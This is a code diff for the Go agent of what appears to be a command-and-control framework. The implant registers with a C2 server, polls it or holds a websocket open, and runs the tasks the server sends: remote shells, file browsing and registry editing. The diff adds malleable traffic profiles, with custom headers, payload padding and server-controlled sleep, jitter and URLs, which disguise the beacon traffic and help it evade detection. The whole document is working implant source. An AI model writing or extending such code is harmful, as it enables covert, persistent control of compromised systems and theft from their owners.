@@ -12,7 +12,6 @@ import (
 	"io"
 	"math/rand"
 	"net/http"
-	"net/url"
 	"strings"
 	"sync"
 	"time"
@@ -30,13 +29,15 @@ import (
 const resultChunkBytes = 512 * 1024
 
 type Agent struct {
-	Config   config.Config
-	State    state.RuntimeState
-	Client   *protocolclient.Client
-	HTTP     *http.Client
-	Files    *filebrowser.Manager
-	Registry *registryeditor.Manager
-	Shells   *session.Manager
+	Config    config.Config
+	State     state.RuntimeState
+	Client    *protocolclient.Client
+	HTTP      *http.Client
+	Files     *filebrowser.Manager
+	Registry  *registryeditor.Manager
+	Shells    *session.Manager
+	Profile   trafficRuntimeProfile
+	profileMu sync.RWMutex
 }
 
 func New(cfg config.Config) (*Agent, error) {
@@ -56,6 +57,7 @@ func New(cfg config.Config) (*Agent, error) {
 		Files:    filebrowser.NewManager(),
 		Registry: registryeditor.NewManager(),
 		Shells:   session.NewManager(),
+		Profile:  defaultRuntimeProfile(cfg),
 	}, nil
 }
 
@@ -87,7 +89,7 @@ func (a *Agent) Run(ctx context.Context) error {
 		select {
 		case <-ctx.Done():
 			return ctx.Err()
-		case <-time.After(SleepDuration(cfg.SleepSeconds, cfg.Jitter)):
+		case <-time.After(SleepDuration(a.currentProfile().SleepSeconds, a.currentProfile().Jitter)):
 		}
 	}
 }
@@ -114,11 +116,16 @@ func (a *Agent) runWebSocketCycle(ctx context.Context) error {
 	cfg := a.cfg()
 	dialer := websocket.Dialer{Subprotocols: []string{"xero.beacon.v1"}}
 	headers := http.Header{}
-	headers.Set("User-Agent", cfg.UserAgent)
-	wsURL, err := websocketURL(cfg.C2URL, a.State.BeaconID)
+	wsURL, err := a.websocketProfileURL()
 	if err != nil {
 		return err
 	}
+	request, err := http.NewRequestWithContext(ctx, http.MethodGet, wsURL, nil)
+	if err != nil {
+		return err
+	}
+	a.applyProfileHeaders(request)
+	headers = request.Header
 	if a.State.BeaconToken != "" {
 		headers.Set("Authorization", "Bearer "+a.State.BeaconToken)
 	}
@@ -156,7 +163,7 @@ func (a *Agent) runWebSocketCycle(ctx context.Context) error {
 }
 
 func (a *Agent) sendAndReceive(conn *websocket.Conn, messageType string, payload map[string]any) (map[string]any, error) {
-	frame, err := a.Client.Encode(messageType, payload)
+	frame, err := a.Client.Encode(messageType, a.payloadWithPadding(messageType, payload))
 	if err != nil {
 		return nil, err
 	}
@@ -174,6 +181,7 @@ func (a *Agent) sendAndReceive(conn *websocket.Conn, messageType string, payload
 	if err != nil {
 		return nil, err
 	}
+	a.applyProfileACK(decoded.Payload)
 	return decoded.Payload, nil
 }
 
@@ -226,6 +234,7 @@ func (a *Agent) runWebSocketReadLoop(ctx context.Context, conn *websocket.Conn) 
 			if err := a.handleWebSocketFrame(ctx, decoded.MessageType, decoded.Payload, writer); err != nil {
 				return err
 			}
+			ticker.Reset(SleepDuration(a.currentProfile().SleepSeconds, a.currentProfile().Jitter))
 		case <-ticker.C:
 			if err := a.writeWebSocketFrame(writer, "HEARTBEAT", heartbeatPayload(a.State.BeaconID, runtimePayload(a.Config))); err != nil {
 				return err
@@ -238,7 +247,7 @@ func (a *Agent) runWebSocketReadLoop(ctx context.Context, conn *websocket.Conn) 
 }
 
 func (a *Agent) writeWebSocketFrame(writer *lockedWebSocketWriter, messageType string, payload map[string]any) error {
-	frame, err := a.Client.Encode(messageType, payload)
+	frame, err := a.Client.Encode(messageType, a.payloadWithPadding(messageType, payload))
 	if err != nil {
 		return err
 	}
@@ -250,6 +259,7 @@ func (a *Agent) writeWebSocketFrame(writer *lockedWebSocketWriter, messageType s
 func (a *Agent) handleWebSocketFrame(ctx context.Context, messageType string, payload map[string]any, writer *lockedWebSocketWriter) error {
 	switch messageType {
 	case "ACK":
+		a.applyProfileACK(payload)
 		return a.executeTaskFromACK(ctx, payload, func(result map[string]any) error {
 			return a.writeWebSocketFrame(writer, "TASK_RESULT", result)
 		})
@@ -575,20 +585,20 @@ func terminalData(payload map[string]any) ([]byte, error) {
 }
 
 func (a *Agent) runLongPollCycle(ctx context.Context) error {
-	if err := a.postFrame(ctx, "HEARTBEAT", heartbeatPayload(a.State.BeaconID, runtimePayload(a.Config))); err != nil {
+	if _, err := a.postFrame(ctx, "HEARTBEAT", heartbeatPayload(a.State.BeaconID, runtimePayload(a.Config))); err != nil {
 		return err
 	}
 	req, err := http.NewRequestWithContext(
 		ctx,
 		http.MethodGet,
-		strings.TrimRight(a.cfg().C2URL, "/")+"/api/v1/beacons/"+a.State.BeaconID+"/poll",
+		a.c2ProfileURL("poll"),
 		nil,
 	)
 	if err != nil {
 		return err
 	}
+	a.applyProfileHeaders(req)
 	req.Header.Set("Authorization", "Bearer "+a.State.BeaconToken)
-	req.Header.Set("User-Agent", a.cfg().UserAgent)
 	response, err := a.HTTP.Do(req)
 	if err != nil {
 		return err
@@ -608,37 +618,51 @@ func (a *Agent) runLongPollCycle(ctx context.Context) error {
 	if err != nil {
 		return err
 	}
+	a.applyProfileACK(decoded.Payload)
 	return a.executeTaskFromACK(ctx, decoded.Payload, func(payload map[string]any) error {
-		return a.postFrame(ctx, "TASK_RESULT", payload)
+		_, err := a.postFrame(ctx, "TASK_RESULT", payload)
+		return err
 	})
 }
 
-func (a *Agent) postFrame(ctx context.Context, messageType string, payload map[string]any) error {
-	frame, err := a.Client.Encode(messageType, payload)
+func (a *Agent) postFrame(ctx context.Context, messageType string, payload map[string]any) (map[string]any, error) {
+	frame, err := a.Client.Encode(messageType, a.payloadWithPadding(messageType, payload))
 	if err != nil {
-		return err
+		return nil, err
 	}
 	req, err := http.NewRequestWithContext(
 		ctx,
 		http.MethodPost,
-		strings.TrimRight(a.cfg().C2URL, "/")+"/api/v1/beacons/"+a.State.BeaconID+"/frame",
+		a.c2ProfileURL("frame"),
 		bytes.NewReader(frame),
 	)
 	if err != nil {
-		return err
+		return nil, err
 	}
+	a.applyProfileHeaders(req)
 	req.Header.Set("Authorization", "Bearer "+a.State.BeaconToken)
 	req.Header.Set("Content-Type", "application/octet-stream")
-	req.Header.Set("User-Agent", a.cfg().UserAgent)
 	response, err := a.HTTP.Do(req)
 	if err != nil {
-		return err
+		return nil, err
 	}
 	defer response.Body.Close()
 	if response.StatusCode < 200 || response.StatusCode >= 300 {
-		return fmt.Errorf("frame POST returned %d", response.StatusCode)
+		return nil, fmt.Errorf("frame POST returned %d", response.StatusCode)
 	}
-	return nil
+	raw, err := io.ReadAll(response.Body)
+	if err != nil {
+		return nil, err
+	}
+	if len(raw) == 0 {
+		return nil, nil
+	}
+	decoded, err := a.Client.Decode(raw)
+	if err != nil {
+		return nil, err
+	}
+	a.applyProfileACK(decoded.Payload)
+	return decoded.Payload, nil
 }
 
 func (a *Agent) restRegister(ctx context.Context) error {
@@ -649,14 +673,14 @@ func (a *Agent) restRegister(ctx context.Context) error {
 	req, err := http.NewRequestWithContext(
 		ctx,
 		http.MethodPost,
-		strings.TrimRight(a.cfg().C2URL, "/")+"/api/v1/beacons/register",
+		a.c2ProfileURL("register"),
 		bytes.NewReader(content),
 	)
 	if err != nil {
 		return err
 	}
+	a.applyProfileHeaders(req)
 	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", a.cfg().UserAgent)
 	response, err := a.HTTP.Do(req)
 	if err != nil {
 		return err
@@ -676,6 +700,7 @@ func (a *Agent) restRegister(ctx context.Context) error {
 	}
 	a.State.BeaconID = beaconID
 	a.State.BeaconToken = token
+	a.applyProfileACK(payload)
 	return state.Save(a.cfg().StatePath, a.State)
 }
 
@@ -687,6 +712,7 @@ func (a *Agent) applyRegisterACK(payload map[string]any) error {
 	}
 	a.State.BeaconID = beaconID
 	a.State.BeaconToken = token
+	a.applyProfileACK(payload)
 	return state.Save(a.cfg().StatePath, a.State)
 }
 
@@ -837,24 +863,6 @@ func heartbeatPayload(beaconID string, runtime map[string]any) map[string]any {
 		payload["beacon_id"] = beaconID
 	}
 	return payload
-}
-
-func websocketURL(c2URL string, beaconID string) (string, error) {
-	parsed, err := url.Parse(strings.TrimRight(c2URL, "/") + "/ws/beacon")
-	if err != nil {
-		return "", err
-	}
-	if parsed.Scheme == "https" {
-		parsed.Scheme = "wss"
-	} else {
-		parsed.Scheme = "ws"
-	}
-	if beaconID != "" {
-		query := parsed.Query()
-		query.Set("beacon_id", beaconID)
-		parsed.RawQuery = query.Encode()
-	}
-	return parsed.String(), nil
 }
 
 func SleepDuration(seconds int, jitter float64) time.Duration {
